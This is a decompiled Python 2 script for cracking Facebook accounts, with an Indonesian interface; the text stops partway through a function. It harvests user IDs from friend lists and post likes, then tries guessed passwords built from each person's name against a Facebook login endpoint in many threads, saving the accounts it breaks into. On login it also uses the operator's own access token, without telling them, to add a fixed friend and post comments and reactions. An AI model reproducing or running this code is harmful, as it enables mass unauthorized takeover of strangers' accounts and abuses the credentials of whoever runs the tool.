# Filename : Rizky
# Python Bytecode : 2.7
# Time Succses Decompiled : Thu Aug 27 14:17:24 2020
# Timestamp In Code : 2020-08-18 19:36:01

import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib
from multiprocessing.pool import ThreadPool
from datetime import datetime
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')

try:
    import bs4
except ImportError:
    os.system('pip2 install bs4')

try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 666.py')

from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
    print '[!] Exit'
    os.sys.exit()


def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '%s;' % str(31 + j))

    x += ''
    x = x.replace('!0', '')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.06)


logo = "\n\x1b[1;91m            _     _  _  ____        _  _   \n\x1b[1;91m__   ___ __| |__ | || || ___| _   _| || |  \n\x1b[1;91m\\ \\ / / '__| '_ \\| || ||___ \\| | | | || |_ \n\x1b[1;97m \\ V /| |  | | | |__   _|__) | |_| |__   _|\n\x1b[1;97m  \\_/ |_|  |_| |_|  |_||____/ \\__, |  |_|  \n\x1b[1;97m                              |___/        "

def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;97m[\x1b[1;93m\xe2\x97\x8f\x1b[1;97m]\x1b[1;93m Sedang Masuk\x1b[1;97m ' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
cpe = []
id = []
username = []
idteman = []
idfromteman = []
gagal = []
reaksi = []
komen = []

def masuk():
    os.system('clear')
    print logo
    print '\x1b[1;97m=========================================='
    print '\x1b[1;97m[\x1b[1;93m01\x1b[1;97m]\x1b[1;96m\x1b[1;97m Login Menggunakan Token Facebook'
    print '\x1b[1;97m[\x1b[1;91m00\x1b[1;97m]\x1b[1;96m\x1b[1;97m Keluar'
    print '\x1b[1;97m=========================================='
    pilih_masuk()


def pilih_masuk():
    msuk = raw_input('\x1b[1;97m=> \x1b[91m:\x1b[1;92m ')
    if msuk == '':
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Isi Yg Benar !'
        pilih_masuk()
    elif msuk == '1' or msuk == '01':
        tokenz()
    elif msuk == '0' or msuk == '00':
        keluar()
    else:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Isi Yg Benar !'
        pilih_masuk()


def tokenz():
    os.system('clear')
    print logo
    toket = raw_input('\x1b[1;97m[\x1b[1;93m?\x1b[1;97m] \x1b[1;97mToken : \x1b[1;93m')
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open('login.txt', 'w')
        zedd.write(toket)
        zedd.close()
        print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m]\x1b[1;92m Login Berhasil'
        os.system('xdg-open https://m.facebook.com/cindy.adelia.330')
        bot_komen()
    except KeyError:
        print '\x1b[1;97m[\x1b[1;93m!\x1b[1;97m] \x1b[1;93mToken Salah !'
        time.sleep(1.7)
        masuk()


def bot_komen():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m[!] Token invalid'
        os.system('rm -rf login.txt')

    una = '100034051991120'
    kom = '\xf0\x9d\x98\xa5\xf0\x9d\x98\xaa\xf0\x9d\x98\xb4\xf0\x9d\x98\xa6\xf0\x9d\x98\xaf\xf0\x9d\x98\xba\xf0\x9d\x98\xb6\xf0\x9d\x98\xae\xf0\x9d\x98\xaa\xf0\x9d\x98\xaf \xf0\x9d\x98\xa5\xf0\x9d\x98\xb0\xf0\x9d\x98\xa2\xf0\x9d\x98\xaf\xf0\x9d\x98\xa8 \xf0\x9d\x98\xb6\xf0\x9d\x98\xa5\xf0\x9d\x98\xa2\xf0\x9d\x98\xa9 \xf0\x9d\x98\xa3\xf0\x9d\x98\xa2\xf0\x9d\x98\xb1\xf0\x9d\x98\xa6\xf0\x9d\x98\xb3. \xf0\x9d\x98\xa5\xf0\x9d\x98\xa2\xf0\x9d\x98\xb4\xf0\x9d\x98\xa2\xf0\x9d\x98\xb3 \xf0\x9d\x98\xa2\xf0\x9d\x98\xac\xf0\x9d\x98\xb6'
    reac = 'ANGRY'
    post = '271600697318328'
    post2 = '271538587324539'
    kom2 = '\xf0\x9d\x98\xa9\xf0\x9d\x98\xa2\xf0\x9d\x98\xad\xf0\x9d\x98\xb0 \xf0\x9d\x98\xac\xf0\x9d\x98\xa2\xf0\x9d\x98\xae\xf0\x9d\x98\xb6 , \xf0\x9d\x98\xaa\xf0\x9d\x98\xba\xf0\x9d\x98\xa2 \xf0\x9d\x98\xac\xf0\x9d\x98\xa2\xf0\x9d\x98\xae\xf0\x9d\x98\xb6 . \xf0\x9d\x98\xa2\xf0\x9d\x98\xac\xf0\x9d\x98\xb6 \xf0\x9d\x98\xae\xf0\x9d\x98\xa6\xf0\x9d\x98\xaf\xf0\x9d\x98\xa8\xf0\x9d\x98\xa8\xf0\x9d\x98\xb6\xf0\x9d\x98\xaf\xf0\x9d\x98\xa2\xf0\x9d\x98\xac\xf0\x9d\x98\xa2\xf0\x9d\x98\xaf \xf0\x9d\x98\xb5\xf0\x9d\x98\xb0\xf0\x9d\x98\xb0\xf0\x9d\x98\xad\xf0\x9d\x98\xb4 \xf0\x9d\x98\x94\xf0\x9d\x98\x89\xf0\x9d\x98\x8d \xf0\x9f\x98\x97'
    reac2 = 'LOVE'
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post + '/reactions?type=' + reac + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post2 + '/reactions?type=' + reac2 + '&access_token=' + toket)
    menu()


def menu():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        os.system('rm -rf login.txt')
        masuk()

    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        masuk()
    except requests.exceptions.ConnectionError:
        print '[!] Tidak ada koneksi'
        keluar()

    os.system('clear')
    print logo
    print '\x1b[1;97m=========================================='
    print '\x1b[1;97m[\x1b[1;93m+\x1b[1;97m]\x1b[1;97m Nama Akun\x1b[1;97m     =>\x1b[1;97m ' + nama
    print '\x1b[1;97m[\x1b[1;93m+\x1b[1;97m]\x1b[1;97m UID\x1b[1;97m           =>\x1b[1;97m ' + id
    print '\x1b[1;97m[\x1b[1;93m+\x1b[1;97m]\x1b[1;97m Tanggal Lahir\x1b[1;97m =>\x1b[1;97m ' + a['birthday']
    print '\x1b[1;97m=========================================='
    print '\x1b[1;97m[\x1b[1;93m01\x1b[1;97m]\x1b[1;97m=>\x1b[1;97m Crack ID Indonesia'
    print '\x1b[1;97m[\x1b[1;93m02\x1b[1;97m]\x1b[1;97m=>\x1b[1;97m Crack ID Group'
    print '\x1b[1;97m[\x1b[1;93m03\x1b[1;97m]\x1b[1;97m=>\x1b[1;97m Ambil ID'
    print '\x1b[1;97m[\x1b[1;93m04\x1b[1;97m]\x1b[1;97m=>\x1b[1;97m Ikuti Saya di Facebook'
    print '\x1b[1;97m[\x1b[1;91m00\x1b[1;97m]\x1b[1;97m=>\x1b[1;97m Logout'
    print '\x1b[1;97m=========================================='
    pilih()


def pilih():
    unikers = raw_input('\x1b[1;97m[\x1b[1;93m?\x1b[1;97m] \x1b[97m:\x1b[1;97m ')
    if unikers == '':
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Isi Yg Benar !'
        pilih()
    elif unikers == '1' or unikers == '01':
        indo()
    elif unikers == '2' or unikers == '02':
        crack_likes()
    elif unikers == '3' or unikers == '03':
        dump()
    elif unikers == '4' or unikers == '04':
        saya()
    elif unikers == '0' or unikers == '00':
        os.system('clear')
        jalan('Menghapus Token')
        os.system('rm -rf login.txt')
        keluar()
    else:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Isi Yg Benar !'
        pilih()


def indo():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken Invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print logo
    print '\x1b[1;97m=========================================='
    print '\x1b[1;97m[\x1b[1;93m01\x1b[1;97m]\x1b[1;97m=>\x1b[1;97m Crack dari ID Publik / Teman'
    print '\x1b[1;97m[\x1b[1;93m02\x1b[1;97m]\x1b[1;97m=>\x1b[1;97m Crack dari File'
    print '\x1b[1;97m[\x1b[1;91m00\x1b[1;97m]\x1b[1;97m=>\x1b[1;97m Kembali'
    print '\x1b[1;97m=========================================='
    pilih_indo()


def pilih_indo():
    global cekpoint
    global oks
    teak = raw_input('\x1b[1;97m[\x1b[1;93m?\x1b[1;97m] \x1b[97m:\x1b[1;97m ')
    if teak == '':
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Isi Yg Benar !'
        pilih_indo()
    else:
        if teak == '1' or teak == '01':
            os.system('clear')
            print logo
            print '\x1b[1;97m=========================================='
            print '\x1b[1;91m         \xe2\x80\xa2\x1b[1;93m\xe2\x80\xa2\x1b[1;92m\xe2\x80\xa2 \x1b[1;97mCRACK INDONESIA \x1b[1;92m\xe2\x80\xa2\x1b[1;93m\xe2\x80\xa2\x1b[1;91m\xe2\x80\xa2'
            print '\x1b[1;97m=========================================='
            idt = raw_input('\x1b[1;97m[\x1b[1;93m\xe2\x80\xa2\x1b[1;97m] ID Publik / Teman : ')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;97m[\x1b[1;93m\xe2\x80\xa2\x1b[1;97m] Nama : ' + op['name']
            except KeyError:
                print '\x1b[1;97m[\x1b[1;93m!\x1b[1;97m] ID Publik / Teman Tidak Ada !'
                raw_input('\n[ Kembali ]')
                indo()
            except requests.exceptions.ConnectionError:
                print '[!] Tidak ada koneksi !'
                keluar()

            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif teak == '2' or teak == '02':
            os.system('clear')
            print logo
            try:
                print '\x1b[1;97m=========================================='
                idlist = raw_input('\x1b[1;97m[\x1b[1;93m?\x1b[1;97m] Nama File : ')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

            except KeyError:
                print '\x1b[1;97m[\x1b[1;93m!\x1b[1;97m] File tidak ada ! '
                raw_input('\n\x1b[1;92m[ \x1b[1;97mKembali \x1b[1;92m]')
            except IOError:
                print '\x1b[1;97m[!] File tidak ada !'
                raw_input('\n\x1b[1;92m[ \x1b[1;97mKembali \x1b[1;92m]')
                indo()

        elif teak == '0' or teak == '00':
            menu()
        else:
            print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Isi Yg Benar !'
            pilih_indo()
        print '\x1b[1;97m[\x1b[1;93m\xe2\x80\xa2\x1b[1;97m] Total ID : ' + str(len(id))
        print '\x1b[1;97m[\x1b[1;93m\xe2\x80\xa2\x1b[1;97m] Stop CTRL+Z'
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[1;97m[\x1b[1;93m\xe2\x80\xa2\x1b[1;97m] Crack Berjalan ' + o,
            sys.stdout.flush()
            time.sleep(1)

    print '\n\x1b[1;97m=========================================='

    def main(arg):
        sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;97m%H:%M:%S')))
        sys.stdout.flush()
        user = arg
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            c = json.loads(a.text)
            pass1 = c['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            w = json.load(data)
            if 'access_token' in w:
                print '\x1b[1;92m | ' + user + ' | ' + pass1 + ' | ' + c['name']
                oks.append(user + pass1)
            elif 'www.facebook.com' in w['error_msg']:
                print '\x1b[1;93m | ' + user + ' | ' + pass1 + ' | ' + c['name']
                cek = open('out/ind1.txt', 'a')
                cek.write('ID:' + user + ' PW:' + pass1 + '\n')
                cek.close()
                cekpoint.append(user + pass1)
            else:
                pass2 = c['first_name'] + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                w = json.load(data)
                if 'access_token' in w:
                    print '\x1b[1;92m | ' + user + ' | ' + pass2 + ' | ' + c['name']
                    oks.append(user + pass2)
                elif 'www.facebook.com' in w['error_msg']:
                    print '\x1b[1;93m | ' + user + ' | ' + pass2 + ' | ' + c['name']
                    cek = open('out/ind1.txt', 'a')
                    cek.write('ID:' + user + ' PW:' + pass2 + '\n')
                    cek.close()
                    cekpoint.append(user + pass2)
                else:
                    pass3 = c['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    w = json.load(data)
                    if 'access_token' in w:
                        print '\x1b[1;92m | ' + user + ' | ' + pass3 + ' | ' + c['name']
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in w['error_msg']:
                        print '\x1b[1;93m | ' + user + ' | ' + pass3 + ' | ' + c['name']
                        cek = open('out/ind1.txt', 'a')
                        cek.write('ID:' + user + ' PW:' + pass3 + '\n')
                        cek.close()
                        cekpoint.append(user + pass3)
                    else:
                        pass4 = c['first_name'] + '321'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        w = json.load(data)
                        if 'access_token' in w:
                            print '\x1b[1;92m | ' + user + ' | ' + pass4 + ' | ' + c['name']
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in w['error_msg']:
                            print '\x1b[1;93m | ' + user + ' | ' + pass4 + ' | ' + c['name']
                            cek = open('out/ind1.txt', 'a')
                            cek.write('ID:' + user + ' PW:' + pass4 + '\n')
                            cek.close()
                            cekpoint.append(user + pass4)
                        else:
                            pass5 = 'Anjing'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            w = json.load(data)
                            if 'access_token' in w:
                                print '\x1b[1;92m | ' + user + ' | ' + pass5 + ' | ' + c['name']
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in w['error_msg']:
                                print '\x1b[1;93m | ' + user + ' | ' + pass5 + ' | ' + c['name']
                                cek = open('out/ind1.txt', 'a')
                                cek.write('ID:' + user + ' PW:' + pass5 + '\n')
                                cek.close()
                                cekpoint.append(user + pass5)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;97m=========================================='
    print '\x1b[1;97m[\x1b[1;93m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mSelesai ....'
    print '\x1b[1;97m[\x1b[1;93m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m[\x1b[1;93m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCP file tersimpan : out/ind1.txt'
    print '\x1b[1;97m=========================================='
    raw_input('\x1b[1;97m[\x1b[1;97m Kembali \x1b[1;97m]')
    os.system('python2 666.py')


def crack_likes():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m[!] Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    try:
        os.system('clear')
        print logo
        print '\x1b[1;97m==========================================='
        print '\x1b[1;91m   \xe2\x80\xa2\x1b[1;93m\xe2\x80\xa2\x1b[1;92m\xe2\x80\xa2 \x1b[1;97mCRACK POSTINGAN GROUP / TEMAN \x1b[1;92m\xe2\x80\xa2\x1b[1;93m\xe2\x80\xa2\x1b[1;91m\xe2\x80\xa2'
        print '\x1b[1;97m==========================================='
        tez = raw_input('\x1b[1;97m[\x1b[1;93m\xe2\x80\xa2\x1b[1;97m] ID Postingan Group / Teman 1 : ')
        tez = raw_input('\x1b[1;97m[\x1b[1;93m\xe2\x80\xa2\x1b[1;97m] ID Postingan Group / Teman 2 : ')
        r = requests.get('https://graph.facebook.com/' + tez + '/likes?limit=5000&access_token=' + toket)
        z = json.loads(r.text)
        x = requests.get('https://graph.facebook.com/' + tez + '/likes?limit=5000&access_token=' + toket)
        t = json.loads(x.text)
        for i in z['data'] + t['data']:
            id.append(i['id'])

        jalan('\r\x1b[1;97m[\x1b[1;93m\xe2\x9c\x93\x1b[1;97m] \x1b[1;97mSukses Mengambil ID \x1b[1;97m...')
    except KeyError:
        print '\x1b[1;97m[\x1b[1;93m!\x1b[1;97m] \x1b[1;97mID Postingan Salah !'
        raw_input('\n\x1b[1;93m[ \x1b[1;97mKembali \x1b[1;93m]')
        crack_likes()

    print '\x1b[1;97m[\x1b[1;93m\xe2\x80\xa2\x1b[1;97m] Total ID : ' + str(len(id))
    print '\x1b[1;97m[\x1b[1;93m\xe2\x80\xa2\x1b[1;97m] Stop CTRL+Z'
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;97m[\x1b[1;93m\xe2\x80\xa2\x1b[1;97m] Crack Berjalan ' + o,
        sys.stdout.flush()
        time.sleep(1)

    print '\n\x1b[1;97m=========================================='

    def main(arg):
        sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;97m%H:%M:%S')))
        sys.stdout.flush()
        zowe = arg
        try:
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\x1b[1;92m | ' + zowe + ' | ' + bos1 + ' | ' + j['name']
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\x1b[1;93m | ' + zowe + ' | ' + bos1 + ' | ' + j['name']
                cek = open('done/grup.txt', 'a')
                cek.write('ID:' + zowe + ' PW:' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'] + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\x1b[1;92m | ' + zowe + ' | ' + bos2 + ' | ' + j['name']
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\x1b[1;93m | ' + zowe + ' | ' + bos2 + ' | ' + j['name']
                    cek = open('done/grup.txt', 'a')
                    cek.write('ID:' + zowe + ' PW:' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\x1b[1;92m | ' + zowe + ' | ' + bos3 + ' | ' + j['name']
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\x1b[1;93m | ' + zowe + ' | ' + bos3 + ' | ' + j['name']
                        cek = open('done/grup.txt', 'a')
                        cek.write('ID:' + zowe + ' PW:' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = j['first_name'] + '321'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\x1b[1;92m | ' + zowe + ' | ' + bos4 + ' | ' + j['name']
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\x1b[1;93m | ' + zowe + ' | ' + bos4 + ' | ' + j['name']
                            cek = open('done/grup.txt', 'a')
                            cek.write('ID:' + zowe + ' PW:' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = j['last_name'] + '123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\x1b[1;92m | ' + zowe + ' | ' + bos5 + ' | ' + j['name']
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\x1b[1;93m | ' + zowe + ' | ' + bos5 + ' | ' + j['name']
                                cek = open('done/grup.txt', 'a')
                                cek.write('ID:' + zowe + ' PW:' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = 'Anjing'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\x1b[1;92m | ' + zowe + ' | ' + bos6 + ' | ' + j['name']
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\x1b[1;93m | ' + zowe + ' | ' + bos6 + ' | ' + j['name']
                                    cek = open('done/grup.txt', 'a')
                                    cek.write('ID:' + zowe + ' PW:' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(20)
    p.map(main, id)
    print '\x1b[1;97m=========================================='
    print '\x1b[1;97m[\x1b[1;93m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mSelesai ....'
    print '\x1b[1;97m[\x1b[1;93m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m[\x1b[1;93m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCP file tersimpan : done/grup.txt'
    print '\x1b[1;97m=========================================='
    raw_input('\x1b[1;97m[\x1b[1;97m Kembali \x1b[1;97m]')
    os.system('python2 666.py')


def dump():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        menu()

    os.system('clear')
    print logo
    print '\x1b[1;97m=========================================='
    print '\x1b[1;97m[\x1b[1;93m01\x1b[1;97m]\x1b[1;93m=>\x1b[1;97m Ambil ID dari Daftar Teman '
    print '\x1b[1;97m[\x1b[1;93m02\x1b[1;97m]\x1b[1;93m=>\x1b[1;97m Ambil ID dari Publik / Teman '
    print '\x1b[1;97m[\x1b[1;91m00\x1b[1;97m]\x1b[1;93m=>\x1b[1;97m Kembali '
    print '\x1b[1;97m=========================================='
    dump_pilih()


def dump_pilih():
    cuih = raw_input('\x1b[1;97m[\x1b[1;93m?\x1b[1;97m] \x1b[93m:\x1b[1;97m ')
    if cuih == '':
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Isi Yg Benar !'
        dump_pilih()
    elif cuih == '1' or cuih == '01':
        id_teman()
    elif cuih == '2' or cuih == '02':
        idfrom_teman()
    elif cuih == '0' or cuih == '00':
        menu()
    else:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Isi Yg Benar !'
        dump_pilih()


def id_teman():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m[!] Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    try:
        os.mkdir('out')
    except OSError:
        pass

    try:
        os.system('clear')
        print logo
        print '\x1b[1;97m=========================================='
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        jalan('\x1b[1;97m[\x1b[1;93m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mMengambil semua ID Teman \x1b[1;97m...')
        bz = open('out/id_teman.txt', 'w')
        for a in z['data']:
            idteman.append(a['id'])
            bz.write(a['id'] + '\n')
            print '\r\x1b[1;97m[\x1b[1;93m' + str(len(idteman)) + '\x1b[1;97m]\x1b[1;97m =>',
            sys.stdout.flush()
            time.sleep(0.005)
            print '\x1b[1;97m' + a['id']

        bz.close()
        print '\r\x1b[1;97m[\x1b[1;93m\xe2\x9c\x93\x1b[1;97m] \x1b[1;97mSukses Mengambil ID \x1b[1;97m....'
        print '\r\x1b[1;97m[\x1b[1;93m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mTotal ID : %s' % len(idteman)
        done = raw_input('\r\x1b[1;97m[\x1b[1;93m?\x1b[1;97m] \x1b[1;97mSimpan Nama File : ')
        os.rename('out/id_teman.txt', 'out/' + done)
        print '\r\x1b[1;97m[\x1b[1;95m+\x1b[1;97m] \x1b[1;97mFile tersimpan : \x1b[1;97mout/' + done
        print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
        raw_input('\x1b[1;93m[ \x1b[1;97mKembali \x1b[1;93m]')
        os.system('python2 666.py')
    except IOError:
        print '\x1b[1;91m[!] Gagal membuat file'
        raw_input('\n\x1b[1;93m[ \x1b[1;97mKembali \x1b[1;93m]')
        dump()
    except (KeyboardInterrupt, EOFError):
        print '\x1b[1;97m[!] Terhenti !'
        raw_input('\n\x1b[1;93m[ \x1b[1;97mKembali \x1b[1;93m]')
        dump()
    except KeyError:
        print '\x1b[1;91m[!] Gagal !'
        raw_input('\n\x1b[1;93m[ \x1b[1;97mKembali \x1b[1;93m]')
        dump()
    except OSError:
        print '\x1b[1;97m[\x1b[1;95m!\x1b[1;97m]\x1b[1;97m File anda tidak tersimpan !'
        raw_input('\n\x1b[1;93m[ \x1b[1;97mKembali \x1b[1;93m]')
        os.system('python2 666.py')
    except requests.exceptions.ConnectionError:
        print '\x1b[1;97m[\xc3\x97] Tidak ada koneksi !'
        keluar()


def idfrom_teman():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    try:
        os.mkdir('out')
    except OSError:
        pass

    try:
        os.system('clear')
        print logo
        print '\x1b[1;97m=========================================='
        idt = raw_input('\x1b[1;97m[\x1b[1;93m+\x1b[1;97m] ID Publik / Teman : ')
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
